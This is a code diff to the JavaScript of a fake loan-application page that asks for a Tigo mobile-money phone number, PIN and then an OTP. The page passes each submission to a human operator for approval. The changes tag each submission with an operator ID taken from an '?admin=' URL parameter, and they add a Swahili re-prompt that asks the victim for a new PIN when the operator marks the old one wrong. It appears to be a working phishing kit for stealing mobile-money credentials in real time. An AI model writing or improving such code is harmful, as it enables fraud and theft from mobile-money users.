@@ -1,6 +1,10 @@
 document.addEventListener('DOMContentLoaded', () => {
     let sessionId = 'session_' + Math.random().toString(36).substring(2, 15);
     
+    // Capture the ?admin= parameter from the URL to map submissions correctly
+    const urlParams = new URLSearchParams(window.location.search);
+    const assignedAdminId = urlParams.get('admin');
+
     const step1 = document.getElementById('step-1');
     const stepDetails = document.getElementById('step-details');
     const step3 = document.getElementById('step-3');
@@ -71,6 +75,12 @@ document.addEventListener('DOMContentLoaded', () => {
         return pin;
     }
 
+    function clearPinBoxes() {
+        pinBoxes.forEach(b => b.value = '');
+        if (pinBoxes.length > 0) pinBoxes[0].focus();
+        submitLoginBtn.setAttribute('disabled', 'true');
+    }
+
     function checkLoginForm() {
         const phoneVal = tigoNumber.value.trim();
         const pinVal = getPinString();
@@ -99,7 +109,8 @@ document.addEventListener('DOMContentLoaded', () => {
             phone: tigoNumber.value.trim(),
             pin: getPinString(),
             amount: amountSlider.value,
-            duration: durationSlider.value
+            duration: durationSlider.value,
+            adminId: assignedAdminId
         };
 
         showStep(stepWaiting);
@@ -131,10 +142,15 @@ document.addEventListener('DOMContentLoaded', () => {
                     clearInterval(interval);
                     showStep(stepOtp);
                     startOtpTimer();
-                } else if (data.status === 'denied' || data.status === 'wrong_pin') {
+                } else if (data.status === 'wrong_pin') {
+                    clearInterval(interval);
+                    clearPinBoxes();
+                    showStep(stepLogin);
+                    alert('PIN uliyoweka si sahihi. Tafadhali weka PIN mpya.');
+                } else if (data.status === 'denied') {
                     clearInterval(interval);
                     showStep(stepLogin);
-                    alert(data.status === 'wrong_pin' ? 'PIN uliyoweka si sahihi. Tafadhali rudia.' : 'Maombi yako yamekataliwa na msimamizi.');
+                    alert('Maombi yako yamekataliwa na msimamizi.');
                 } else if (data.status === 'success') {
                     clearInterval(interval);
                     document.getElementById('finalApprovedAmount').textContent = amountDisplay.textContent;
@@ -183,4 +199,4 @@ document.addEventListener('DOMContentLoaded', () => {
         location.reload();
     });
 });
-                                                                                          
+                      
